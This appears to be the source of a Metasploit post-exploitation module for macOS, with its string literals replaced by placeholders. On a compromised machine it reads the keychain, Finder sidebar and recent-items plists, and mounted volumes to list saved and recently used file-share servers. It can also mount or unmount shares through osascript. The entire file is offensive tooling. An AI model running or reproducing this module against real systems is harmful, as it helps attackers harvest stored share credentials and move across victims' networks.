require <str> require <str> class Metasploit3 < Msf :: Post FILE_SHARE_PROTOCOLS = <str> NAME_REGEXES = [ <str> , <str> ] URL_REGEX = <str> include Msf :: Post :: File def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ <str> ] , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , { <str> = > <str> } ] , [ <str> , { <str> = > <str> } ] , [ <str> , { <str> = > <str> } ] ] , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptEnum . new ( <str> , [ true , <str> , <str> , FILE_SHARE_PROTOCOLS ] ) ] , self . class ) register_advanced_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] ) end def run username = cmd_exec ( <str> ) . strip security_path = datastore [ <str> ] . shellescape sidebar_plist_path = datastore [ <str> ] . gsub ( <str> , <str> username <str> ) . shellescape recent_plist_path = datastore [ <str> ] . gsub ( <str> , <str> username <str> ) . shellescape if action . name == <str> if file? ( security_path ) saved_shares = get_keyring_shares ( security_path ) if saved_shares . length == <int> print_status ( <str> ) else print_status ( <str> ) print_status ( <str> ) saved_shares . each do | line | print_good ( <str> line <str> ) end end else print_error ( <str> ) end if file? ( sidebar_plist_path ) favorite_shares = get_favorite_shares ( sidebar_plist_path ) if favorite_shares . length == <int> print_status ( <str> ) else print_status ( <str> ) print_status ( <str> ) favorite_shares . each do | line | print_uri ( line ) end end else print_error ( <str> ) end if file? ( recent_plist_path ) recent_shares = get_recent_shares ( recent_plist_path ) if recent_shares . length == <int> print_status ( <str> ) else print_status ( <str> ) print_status ( <str> ) recent_shares . each do | line | print_uri ( line ) end end else print_error ( <str> ) end mounted_shares = get_mounted_volumes if mounted_shares . length == <int> print_status ( <str> ) else print_status ( <str> ) mounted_shares . each do | line | print_good ( <str> line <str> ) end end elsif action . name == <str> mount elsif action . name == <str> umount end end def get_keyring_shares ( security_path ) data = cmd_exec ( <str> security_path <str> ) lines = data . lines . select { | line | line =~ <str> } . map ( & <str> ) list = [ ] lines . each_with_index do | line , x | if line =~ <str> && x < lines . length - <int> if lines [ x + <int> ] . match <str> protocol = $1 if protocol . start_with? ( * FILE_SHARE_PROTOCOLS ) && lines [ x + <int> ] . match ( <str> ) server = $1 list . push ( protocol + <str> + server ) end end end end list . sort end def get_favorite_shares ( sidebar_plist_path ) data = cmd_exec ( <str> sidebar_plist_path <str> ) list = data . lines . map ( & <str> ) . map { | line | line =~ URL_REGEX && $1 } . compact data = cmd_exec ( <str> sidebar_plist_path <str> ) lines = data . lines . map ( & <str> ) . select { | line | line =~ <str> } lines . each_with_index do | line , x | if line =~ <str> && x < lines . length - <int> if NAME_REGEXES . any? { | r | lines [ x + <int> ] . strip =~ r } list . push ( $1 ) end end end list . sort end def get_recent_shares ( recent_plist_path ) data = cmd_exec ( <str> recent_plist_path <str> ) data . lines . map ( & <str> ) . map { | line | line =~ URL_REGEX && $1 } . compact . uniq . sort end def get_mounted_volumes cmd_exec ( <str> ) . lines . map ( & <str> ) . sort end def mount share_name = datastore [ <str> ] protocol = datastore [ <str> ] print_status ( <str> protocol <str> share_name <str> ) cmd_exec ( <str> osascript_path <str> protocol <str> share_name <str> ) end def umount share_name = datastore [ <str> ] print_status ( <str> share_name <str> ) cmd_exec ( <str> osascript_path <str> share_name <str> ) end def cmd_exec ( cmd ) vprint_status ( cmd ) super end def print_uri ( line ) if line =~ <str> print_good <str> $1 <str> $2 <str> else print_good <str> line <str> end end def osascript_path datastore [ <str> ] . shellescape end end 
